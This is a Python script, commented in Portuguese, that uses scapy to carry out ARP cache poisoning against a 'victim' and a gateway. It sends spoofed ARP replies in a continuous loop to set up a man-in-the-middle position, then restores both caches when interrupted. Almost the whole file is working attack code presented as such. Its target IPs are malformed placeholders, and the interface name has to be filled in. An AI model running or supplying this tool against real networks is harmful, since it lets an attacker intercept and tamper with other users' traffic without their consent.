from scapy.layers.l2 import ARP       # Importa a classe ARP do módulo scapy.layers.l2
from scapy.sendrecv import send, sr1  # Importa as funções send e sr1 do módulo scapy.sendrecv
from scapy.all import get_if_hwaddr   # Importa a função get_if_hwaddr do módulo scapy.all
import time

def arp_poison(target_ip, gateway_ip, interface):
    """
    Envia um pacote ARP spoofing para envenenar o cache ARP da vítima.

    Args:
    - target_ip (str): Endereço IP da vítima.
    - gateway_ip (str): Endereço IP do gateway (roteador).
    - interface (str): Nome da interface de rede a ser utilizada.

    """
    try:
        # Obtém o endereço MAC da vítima
        target_mac = get_mac(target_ip)
        # Cria um pacote ARP spoofing para envenenar o cache ARP da vítima
        arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=get_if_hwaddr(interface), op=2)
        # Envia o pacote ARP spoofing
        send(arp_response, iface=interface, verbose=0)
        print(f"[+] Sent ARP poison to {target_ip}")
    except Exception as e:
        print(f"[-] Error: {str(e)}")

def get_mac(ip_address):
    """
    Obtém o endereço MAC correspondente a um endereço IP usando um pacote ARP request.

    Args:
    - ip_address (str): Endereço IP do qual deseja-se obter o MAC.

    Returns:
    - str: Endereço MAC correspondente ao IP especificado, ou None se não encontrado.

    """
    # Envia um pacote ARP request para obter o endereço MAC correspondente ao IP
    arp_request = ARP(pdst=ip_address)
    # Envia e recebe pacotes ARP request, retorna o endereço MAC de destino
    arp_response = sr1(arp_request, timeout=0.1, verbose=0)
    return arp_response.hwsrc if arp_response else None

def restore_target(target_ip, target_mac, gateway_ip, gateway_mac, interface):
    """
    Restaura o cache ARP da vítima e do gateway após o término do ataque.

    Args:
    - target_ip (str): Endereço IP da vítima.
    - target_mac (str): Endereço MAC da vítima.
    - gateway_ip (str): Endereço IP do gateway (roteador).
    - gateway_mac (str): Endereço MAC do gateway.
    - interface (str): Nome da interface de rede a ser utilizada.

    """
    try:
        # Cria pacotes ARP para restaurar o cache ARP da vítima e do gateway
        # Pacote para a vítima
        arp_victim = ARP(pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac, op=2)
        # Pacote para o gateway
        arp_gateway = ARP(pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac, op=2)
        
        # Envio dos pacotes ARP para restauração dos caches
        send(arp_victim, iface=interface, verbose=0)
        send(arp_gateway, iface=interface, verbose=0)
        
        print(f"[+] Restored ARP caches for {target_ip} and {gateway_ip}")
    except Exception as e:
        print(f"[-] Error restoring ARP caches: {str(e)}")

if __name__ == "__main__":
    # Configurações de rede
    target_ip = "0.0.0.0.0.0.0.0.0"    # IP da vítima
    gateway_ip = "0.0.0.0.0.0.0.0.0"    # IP do gateway (roteador)
    interface = "REDE"      # Interface de rede (ajuste conforme sua máquina)

    try:
        while True:
            # Envenena o cache ARP da vítima e do gateway
            arp_poison(target_ip, gateway_ip, interface)
            arp_poison(gateway_ip, target_ip, interface)
            time.sleep(0.1)  # Intervalo entre os envios dos pacotes ARP spoofing

    except KeyboardInterrupt:
        print("\n[+] Stopping ARP poison attack.")
        # Restaura os caches ARP das vítimas e do gateway após interromper o ataque
        target_mac = get_mac(target_ip)
        gateway_mac = get_mac(gateway_ip)
        restore_target(target_ip, target_mac, gateway_ip, gateway_mac, interface)
        